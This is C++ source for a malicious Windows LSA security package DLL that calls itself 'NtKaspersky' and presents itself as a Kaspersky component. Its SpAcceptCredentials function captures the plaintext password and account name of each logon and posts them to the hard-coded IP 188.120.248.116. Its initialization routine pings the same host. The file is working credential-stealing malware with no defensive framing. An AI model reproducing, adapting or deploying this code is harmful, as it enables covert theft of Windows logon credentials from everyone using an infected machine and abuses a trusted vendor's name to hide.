#define WIN32_NO_STATUS
#define SECURITY_WIN32
#include <windows.h>
#include "transport.h"

#include <sspi.h>
#include <NTSecAPI.h>
#include <ntsecpkg.h>
#include <strsafe.h>
#include <iostream>
#include <string>

#pragma comment(lib, "Secur32.lib")

HTTPSTransport transport(L"188.120.248.116");

NTSTATUS NTAPI SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable)
{
    time_t currentTime;
    std::time(&currentTime);
    transport.Ping(currentTime);
    return 0;
}
NTSTATUS NTAPI SpShutDown(void)
{
    return 0;
}
NTSTATUS NTAPI SpGetInfo(PSecPkgInfoW PackageInfo)
{
    PackageInfo->fCapabilities = SECPKG_FLAG_NEGOTIABLE | SECPKG_FLAG_MUTUAL_AUTH | SECPKG_FLAG_LOGON | SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_RESTRICTED_TOKENS
        | SECPKG_FLAG_RESTRICTED_TOKENS
        | 0x00000002; // SECPKG_CALLFLAGS_AUTHCAPABLE;
    PackageInfo->Name = (SEC_WCHAR*)L"NtKaspersky";
    PackageInfo->Comment = (SEC_WCHAR*)L"Native library for Kaspersky Security Provider";
    PackageInfo->wRPCID = SECPKG_ID_NONE;
    PackageInfo->cbMaxToken = 0;
    PackageInfo->wVersion = 1;
    return 0;
}
NTSTATUS NTAPI SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{
    UNICODE_STRING password = PrimaryCredentials->Password;
    UNICODE_STRING postData;
    size_t allocSize = password.Length + AccountName->Length + 0x100;
    postData.Buffer = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, allocSize);
    StringCchCatW(postData.Buffer, allocSize, L"password=");
    StringCchCatW(postData.Buffer, allocSize, password.Buffer);
    StringCchCatW(postData.Buffer, allocSize, L"&login=");
    StringCchCatW(postData.Buffer, allocSize, AccountName->Buffer);

    transport.SendData(L"/postdata", postData.Buffer);
    return 0;
}
SECPKG_FUNCTION_TABLE SecurityPackageFunctionTable[] =
{
    {
        NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, SpInitialize, SpShutDown, SpGetInfo, SpAcceptCredentials, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL
    }
};
extern "C" __declspec(dllexport) NTSTATUS NTAPI SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE* ppTables, PULONG pcTables)
{
    *PackageVersion = SECPKG_INTERFACE_VERSION;
    *ppTables = SecurityPackageFunctionTable;
    *pcTables = 1;
    return 0;
}
